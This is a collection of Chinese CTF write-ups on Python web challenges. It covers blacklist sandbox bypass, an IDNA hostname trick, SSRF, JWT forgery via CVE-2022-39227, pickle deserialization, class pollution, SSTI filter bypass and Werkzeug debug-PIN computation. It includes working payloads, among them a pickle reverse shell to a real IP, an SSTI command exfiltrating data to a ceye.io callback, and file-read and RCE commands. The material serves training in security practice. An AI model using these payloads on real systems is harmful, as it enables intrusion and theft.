## [DubheCTF 2024] ezPythonCheckin

源码

```python
import atexit
import base64
import json
import os
import subprocess
from tempfile import NamedTemporaryFile

black_list = [
    "nosec",
    "import",
    "load",
    "''",
    '""',
    "[]",
    "{}",
    "().",
    "builtins",
    "dict",
    "dir",
    "locals",
    "base",
    "classes",
    "+",
    "mro",
    "attribute",
    "id",
]


def main():
    print("Hello!")
    print("Please send base64 encoded string!")
    data = input("> ")

    if len(data) > 1600:
        print("Too long")
        return

    decode_data = base64.b64decode(data).decode()
    if any(item in decode_data for item in black_list):
        print("Not Safe")
        return

    with NamedTemporaryFile("wt", suffix=".py", delete=False, encoding="utf-8") as f:
        f.write(decode_data)
        temp_filename = f.name
    atexit.register(os.remove, temp_filename)

    check_result = json.loads(
        subprocess.run(
            ["bandit", "-r", temp_filename, "-f", "json"],
            capture_output=True,
            encoding="utf-8",
        ).stdout
    )

    if len(check_result["results"]) == 0:
        print("[+] OK")
        subprocess.run(["python3", temp_filename], timeout=60)
        print("[+] Over")
    else:
        print("[+] Not Safe")
    return


if __name__ == "__main__":
    try:
        main()
    except Exception:
        print(b"[+] FAILED!")
        pass
```

黑名单，过滤了很多

```
black_list = [
    "nosec",
    "import",
    "load",
    "''",
    '""',
    "[]",
    "{}",
    "().",
    "builtins",
    "dict",
    "dir",
    "locals",
    "base",
    "classes",
    "+",
    "mro",
    "attribute",
    "id",
]
```

没有过滤open，我们直接open读取文件

```
with open('/flag', 'r') as file:
    content = file.read()
print(content)
```

```
d2l0aCBvcGVuKCcvZmxhZycsICdyJykgYXMgZmlsZToKICAgIGNvbnRlbnQgPSBmaWxlLnJlYWQoKQpwcmludChjb250ZW50KQ==
```

## [SUCTF 2019]Pythonginx(特殊字符绕过)

源码

```python
@app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return "我扌 your problem? 111"
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return "我扌 your problem? 222 " + host
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()
    else:
        return "我扌 your problem? 333"
```

urlparse和urlsplit函数都可以分解url

```python
import urllib
import urllib.parse

url = 'http://www.baidu.com/index.html;user?id=5#comment'

result = urllib.parse.urlparse(url)
result1 = urllib.parse.urlsplit(url)

print(result,'\n',result1)
```

结果

```
ParseResult(scheme='http', netloc='www.baidu.com', path='/index.html', params='user', query='id=5', fragment='comment')
SplitResult(scheme='http', netloc='www.baidu.com', path='/index.html;user', query='id=5', fragment='comment')
```

这个代码是，前两次host不能等于suctf.cc，最后一次等于suctf.cc

关键点在

```
for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
```

先idna编码，在utf-8解码，那就找一些unicode编码（经过这样后，是正常的字母）

```python
chars = ['s', 'u', 'c', 't', 'f']

for c in chars:
	for i in range(0x7f, 0x10FFFF):
		try:
			char_i = chr(i).encode('idna').decode('utf-8')
			if char_i == c:
				print('ASCII: {}   Unicode: {}    Number: {}'.format(c, chr(i), i))
		except:
			pass
```

payload

```
file://Ｓuctf.cc/usr/local/nginx/conf/nginx.conf 读取nginx的配置文件
```

```
file://Ｓuctf.cc/usr/fffffflag
```

[参考](https://www.cnblogs.com/hackerone/p/17509147.html)

## Python里的SSRF

题目描述

> 尝试访问到容器内部的 8000 端口和 url path /api/internal/secret 即可获取 flag

```
127.0.0.1被过滤
2130706433被过滤
0没被过滤
sudo.cc没过滤
```

payload

```
url=http://0:8000/api/internal/secret
url=http://sudo.cc:8000/api/internal/secret 需要多点几下
```

## Ye's Pickle(jwt伪造，pickle反序列化)

源码

```python
# -*- coding: utf-8 -*-
import base64
import string
import random
from flask import *
import jwcrypto.jwk as jwk
import pickle
from python_jwt import *
app = Flask(__name__)

def generate_random_string(length=16):
    characters = string.ascii_letters + string.digits  # 包含字母和数字
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string
app.config['SECRET_KEY'] = generate_random_string(16)
key = jwk.JWK.generate(kty='RSA', size=2048)
@app.route("/")
def index():
    payload=request.args.get("token")
    if payload:
        token=verify_jwt(payload, key, ['PS256'])
        session["role"]=token[1]['role']
        return render_template('index.html')
    else:
        session["role"]="guest"
        user={"username":"boogipop","role":"guest"}
        jwt = generate_jwt(user, key, 'PS256', timedelta(minutes=60))
        return render_template('index.html',token=jwt)

@app.route("/pickle")
def unser():
    if session["role"]=="admin":
        pickle.loads(base64.b64decode(request.args.get("pickle")))
        return render_template("index.html")
    else:
        return render_template("index.html")
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
```

> 根路由，构造jwt的值

```python
@app.route("/")
def index():
    payload=request.args.get("token") # 获取一个GET参数
    if payload:
        token=verify_jwt(payload, key, ['PS256'])
        session["role"]=token[1]['role']
        return render_template('index.html')
    else:
        session["role"]="guest"
        user={"username":"boogipop","role":"guest"}
        jwt = generate_jwt(user, key, 'PS256', timedelta(minutes=60))
        return render_template('index.html',token=jwt)
```

> pickle路由，role等于admin就pickle反序列化（没啥过滤）

```python
@app.route("/pickle")
def unser():
    if session["role"]=="admin":
        pickle.loads(base64.b64decode(request.args.get("pickle")))
        return render_template("index.html")
    else:
        return render_template("index.html")
```

![image-20240320202530199](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240320202530199.png)

接着就要构造jwt，这里利用[CVE-2022-39227](https://github.com/user0x1337/CVE-2022-39227)这个漏洞

> poc的用法 
>
> ```
> python3 cve_2022_39227.py -j <JWT-WEBTOKEN> -i "<KEY>=<VALUE>"
> ```

```
python main.py -j eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA5MzcxMDksImlhdCI6MTcxMDkzMzUwOSwianRpIjoiUFdCYU9MU1pKdGNUbDB1ZGpqNFROZyIsIm5iZiI6MTcxMDkzMzUwOSwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.TZmuJn65uPPGzalHMQLQWz13J_bKa8FZkvYZ3mXoGALIQXXCJvNTmpTrvbPttBE1DSnGsSAdV4yYUTCpVbgSIZ1xRJPNCFe1zIW81QUpZIj9dFLvnXTnzejgDU6EDXCBts2YIjuHNgzq4A29j3j6hRBnRZRe420ltCU2LX9nzTTKeo5HxNzHUGHfl5PsA_D9gxRyLAtawIeyTrDheSEzYv6RLOXkdPAwK-zH57MYU_FuLr2JDRKxey372uxBReISv5FArNaHMk5y_BgvtxxjTl4S64XqGNnRrk8Xu0UQ8qLZezC1ZeCG_ErT4-CjkOm0p0VtkIHozrcx6TjF0G-n4A -i "role=admin"
```

通过get进行传参，让role=admin

```http
GET /?token={%22%20%20eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA5MzcxMDksImlhdCI6MTcxMDkzMzUwOSwianRpIjoiUFdCYU9MU1pKdGNUbDB1ZGpqNFROZyIsIm5iZiI6MTcxMDkzMzUwOSwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJib29naXBvcCJ9.%22:%22%22,%22protected%22:%22eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9%22,%20%22payload%22:%22eyJleHAiOjE3MTA5MzcxMDksImlhdCI6MTcxMDkzMzUwOSwianRpIjoiUFdCYU9MU1pKdGNUbDB1ZGpqNFROZyIsIm5iZiI6MTcxMDkzMzUwOSwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9%22,%22signature%22:%22TZmuJn65uPPGzalHMQLQWz13J_bKa8FZkvYZ3mXoGALIQXXCJvNTmpTrvbPttBE1DSnGsSAdV4yYUTCpVbgSIZ1xRJPNCFe1zIW81QUpZIj9dFLvnXTnzejgDU6EDXCBts2YIjuHNgzq4A29j3j6hRBnRZRe420ltCU2LX9nzTTKeo5HxNzHUGHfl5PsA_D9gxRyLAtawIeyTrDheSEzYv6RLOXkdPAwK-zH57MYU_FuLr2JDRKxey372uxBReISv5FArNaHMk5y_BgvtxxjTl4S64XqGNnRrk8Xu0UQ8qLZezC1ZeCG_ErT4-CjkOm0p0VtkIHozrcx6TjF0G-n4A%22} HTTP/1.1
Host: f8c1adf2-03c7-4d41-a6c0-5c3bde12b829.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://f8c1adf2-03c7-4d41-a6c0-5c3bde12b829.node5.buuoj.cn:81/
Cookie: session=eyJyb2xlIjoiZ3Vlc3QifQ.ZfrJNw.Uix84ZTCM9TKnr_Sdv0KQ2kJBsI
Upgrade-Insecure-Requests: 1
```

![image-20240320203033539](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240320203033539.png)

将这个解码，role等于admin就代表成功了

接着就是pickle反序列化，由于没有任何过滤，直接反弹shell

```python
import base64
opcode=b'''cos
system
(S"bash -c 'bash -i >& /dev/tcp/119.28.136.36/9001 0>&1'"
tR.
'''
print(base64.b64encode(opcode))
```

这里我试了好久，反弹不成功

还可以利用报错进行回显，**前提是得开启debug**

```python
import pickle
import base64

class A():
	def __reduce__(self):
		return (exec,("raise Exception(__import__('os').popen('cat /f*').read())",))


poc = base64.b64encode(pickle.dumps(A()))
print(poc)
```

![image-20240320203447886](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240320203447886.png)

## 极客大挑战2023

### ezpython

> 题目描述：can you pollute me?

直接给了源码

```python
import json
import os

from waf import waf
import importlib
from flask import Flask,render_template,request,redirect,url_for,session,render_template_string

app = Flask(__name__)
app.secret_key='jjjjggggggreekchallenge202333333'
class User():
    def __init__(self):
        self.username=""
        self.password=""
        self.isvip=False


class hhh(User):
    def __init__(self):
        self.username=""
        self.password=""

registered_users=[]
@app.route('/')
def hello_world():  # put application's code here
    return render_template("welcome.html")

@app.route('/play')
def play():
    username=session.get('username')
    if username:
        return render_template('index.html',name=username)
    else:
        return redirect(url_for('login'))

@app.route('/login',methods=['GET','POST'])
def login():
    if request.method == 'POST':
        username=request.form.get('username')
        password=request.form.get('password')
        user = next((user for user in registered_users if user.username == username and user.password == password), None)
        if user:
            session['username'] = user.username
            session['password']=user.password
            return redirect(url_for('play'))
        else:
            return "Invalid login"
        return redirect(url_for('play'))
    return render_template("login.html")

@app.route('/register',methods=['GET','POST'])
def register():
    if request.method == 'POST':
        try:
            if waf(request.data):
                return "fuck payload!Hacker!!!"
            data=json.loads(request.data)
            if "username" not in data or "password" not in data:
                return "连用户名密码都没有你注册啥呢"
            user=hhh()
            merge(data,user)
            registered_users.append(user)
        except Exception as e:
            return "泰酷辣,没有注册成功捏"
        return redirect(url_for('login'))
    else:
        return render_template("register.html")

@app.route('/flag',methods=['GET'])
def flag():
    user = next((user for user in registered_users if user.username ==session['username']  and user.password == session['password']), None)
    if user:
        if user.isvip:
            data=request.args.get('num')
            if data:
                if '0' not in data and data != "123456789" and int(data) == 123456789 and len(data) <=10:
                        return render_template('flag.html',flag="flag{you_win}")
                else:
                    return "你的数字不对哦!"
            else:
                return "I need a num!!!"
        else:
            return render_template_string('这种神功你不充VIP也想学?<p><img src="{{url_for(\'static\',filename=\'weixin.png\')}}">要不v我50,我送你一个VIP吧,嘻嘻</p>')
    else:
        return "先登录去"

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)


if __name__ == '__main__':
    app.run(host="0.0.0.0",port="8888")
```

有merge函数，猜测可能是python原型链污染

看了flag路由，关键是让isvip等于True（这里isvip等于flase的话，访问flag就会爆500）

```python
class User():
    def __init__(self):
        self.username=""
        self.password=""
        self.isvip=False


class hhh(User):
    def __init__(self):
        self.username=""
        self.password=""


user = hhh()
User = User()
print(user.__class__) # hhh类
user.__class__.__base__.isvip = True # 让User类的isvip属性等于True
print(User.isvip) # 这里还是flase，因为是直接调用了User类中的isvip
print(user.isvip) # 这里是True，因为hhh类中没有isvip属性，就会找父类的属性
```

payload

```json
{"username":"admin","password":"123456","__class__":{"__base__":{"\u0069\u0073\u0076\u0069\u0070":"True"}}}
```

这里isvip被过滤了，用unicode编码绕过，这里就相当于给User()类添加了一个`isvip`属性并且值为True

登录后，没有发现啥东西，直接访问flag

```python
if '0' not in data and data != "123456789" and int(data) == 123456789 and len(data) <=10:
```

这里用`Non-ASCII Identifies`绕过，https://www.compart.com/en/unicode/

在这个网站中可以找到一些特殊的unicode字符

例如，我找了一个代表数字1的字符

![image-20240321132309914](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240321132309914.png)

payload

```
num=١23456789
```

从源码中得到flag

![image-20240321132448348](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240321132448348.png)

### klf_ssti

访问hack，传klf参数

发现输入什么都回显

![image-20240321134324884](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240321134324884.png)

猜测是python的ssti注入

payload

这个地方是无回显，那就利用curl，ping进行带外

我这是使用windows复现的，直接ping了

```
{{config.__class__.__init__.__globals__['os'].popen('ping %USERNAME%.5k7ku.ceye.io').read()}}
```

![image-20240321134755369](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240321134755369.png)

得到用户名

### klf_2

```python
from flask import Flask, request, render_template, render_template_string,send_from_directory
import re
import os

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    return render_template('index.html')

@app.route('/secr3ttt', methods=['GET', 'POST'])
def secr3t():
    klf = request.args.get('klf', '')
    template = f'''
       <html>
           <body>
               <h1>别找了，这次你肯定是klf</h1>     
           </body>
           <img src="https://image-obsidian-1317327960.cos.ap-chengdu.myqcloud.com/obisidian-blog/0071088CAC91D2C42C4D31053A7E8D2B731D69.jpg" alt="g">
            <h1>%s</h1>   
       </html>
       <!--klf?-->
       <!-- 别想要flag？klf -->

       '''
    bl = ['_', '\\', '\'', '"', 'request', "+", 'class', 'init', 'arg', 'config', 'app', 'self', 'cd', 'chr',
      'request', 'url', 'builtins', 'globals', 'base', 'pop', 'import', 'popen', 'getitem', 'subclasses', '/',
      'flashed', 'os', 'open', 'read', 'count', '*', '38', '124', '47', '59', '99', '100', 'cat', '~',
      ':', 'not', '0', '-', 'ord', '37', '94', '96', '[',']','index','length']#'43', '45',
    for i in bl:
        if i in klf:
            return render_template('klf.html')

    a = render_template_string(template % klf)
    if "{" in a:
        return  a + render_template('win.html')

    return a



@app.route('/robots.txt', methods=['GET'])
def robots():
    return send_from_directory(os.path.join(app.root_path, 'static'),
                               'robots.txt', mimetype='text/plain')




if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7889, debug=False)
```

过滤的太多了，直接用过滤器

payload

```python
{% set po=dict(po=1,p=2)|join()%}
{% set a=(()|select|string|list)|attr(po)(24)%} 
{% set oo=dict(o=a,s=a)|join()%}
{% set p=dict(po=a,pen=a)|join()%}
{% set ch=dict(ch=a,r=a)|join()%}
{% set in=(a,a,dict(in=a,it=a)|join,a,a)|join()%}
{% set gl=(a,a,dict(glob=a,als=q)|join,a,a)|join()%}
{% set ge=(a,a,dict(geti=a,tem=a)|join,a,a)|join()%}
{% set bu=(a,a,dict(bui=a,ltins=a)|join,a,a)|join()%}
{% set im=(a,a,dict(imp=a,ort=a)|join,a,a)|join()%}
{% set cl=(a,a,dict(cla=a,ss=a)|join,a,a)|join()%}
{% set su=(a,a,dict(subcla=a,sses=a)|join,a,a)|join()%}
{% set ba=(a,a,dict(ba=a,se=a)|join,a,a)|join()%}
{% set x=jay17|attr(cl)|attr(ba)|attr(su)()%}
{% set chhr=()|attr(cl)|attr(ba)|attr(su)()|attr(ge)(117)|attr(in)|attr(gl)|attr(ge)(bu)|attr(ge)(ch)%}
{% set pp=()|attr(cl)|attr(ba)|attr(su)()|attr(ge)(117)|attr(in)|attr(gl)|attr(ge)(p)%}
{% set re=dict(re=a,ad=a)|join()%}
{% set en=dict(en=a,v=a)|join()%}
{% set fl=dict(fl=a,ag=a)|join()%}
{% set ta=dict(ta=a,c=a)|join()%}
{% set kgxg=(chhr(3２),chhr(4７))|join()%}
{% set tf=(ta,kgxg,fl)|join()%}
{% set ll=dict(l=a,s=a)|join()%}
{% set lll=(ll,kgxg)|join()%}
{% set la=(ll,kgxg,dict(ap=a,p=a)|join)|join()%}
{% set ha=dict(ha=a,hahaha=a)|join()%}
{% set th=(ta,chhr(3２),ha)|join()%}
{% set ym=(dict(ca=a,t=a)|join,chhr(3２),dict(ap=a,p=a)|join,chhr(4６),dict(p=a,y=a)|join)|join()%}
{% set six=(ta,kgxg,dict(ap=a,p=a)|join,chhr(4７),dict(fl4gfl4=a,gfl4g=a)|join)|join()%}
{% set cmd=pp(six)|attr(re)()%}
{{cmd}}
```

服啦，过滤的太多了，写不出来

## polar flask_pin

打开题目，发现报错，得到一部分源码

```python
from flask import Flask, request
app = Flask(__name__)
 
@app.route("/")
def hello():
    return Hello['a']
 
@app.route("/file")
def file():
    filename = request.args.get('filename')
    try:
```

访问file路由，有个filename参数可以进行文件读取

接着访问console发现需要输入PIN码，那就是读取文件然后进行RCE了

> 拼凑出PIN的所有计算要素（六个），从而自己计算出PIN码
>
> 1.username = root
> 通过getpass.getuser()读取或者通过文件读取/etc/passwd
>
> 2.modname = flask.app
> 通过getattr(mod,“file”,None)读取，默认值为flask.app
>
> 3.appname = Flask
> 通过getattr(app,“name”,type(app).name)读取，默认值为Flask
>
> 4.moddir = /usr/local/lib/python3.5/site-packages/flask/app.py
> flask库下app.py的绝对路径、当前网络的mac地址的十进制数，通过getattr(mod,“file”,None)读取实际应用中通过报错读取,如传参的时候给个不存在的变量
>
> 5.uuidnode = 2485376933521
> mac地址的十进制,通过uuid.getnode()读取，通过文件/sys/class/net/eth0/address得到16进制结果，转化为10进制进行计算
>
> 6.machine_id = c31eea55a29431535ff01de94bdcf5cf0daba752a54681af6e8b216e32f7a76a0118dd55b8fe82906d9a9a1b4bd569bf
> 机器码，每一个机器都会有自已唯一的id，（Linux下）machine_id由三个合并(docker就2.3或者1.3)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup(第一行的/docker/字符串后面的内容)windows读取注册表中的HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography
> 一般生成pin码不对就是这错了。

1. 获取用户名，这里就是root，看/etc/passwd文件
2. modname默认值为flask.app
3. appname默认值为Flask
4. moddir flask库下app.py的绝对路径
5. mac地址的十进制
6. machine_id由俩个文件组合而成

计算PIN码，python3.6以下是MD5加密，以上是sha1加密

```python
#MD5
import hashlib
from itertools import chain
probably_public_bits = [
    'root',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.5/site-packages/flask/app.py'# getattr(mod, '__file__', None),
]

private_bits = [
    '2485376914036',
    'c31eea55a29431535ff01de94bdcf5cfea163ddc9c2c8c79c224e150fab1df832278879c09689e3e6df72197f54ee9f4'
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
   h.update(b'pinsalt')
   num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
   for group_size in 5, 4, 3:
       if len(num) % group_size == 0:
          rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                      for x in range(0, len(num), group_size))
          break
       else:
          rv = num

print(rv)
```

进入控制台

```
import os
os.popen('ls /').read()
os.popen('cat /flaggggg').read()
```

得到flag
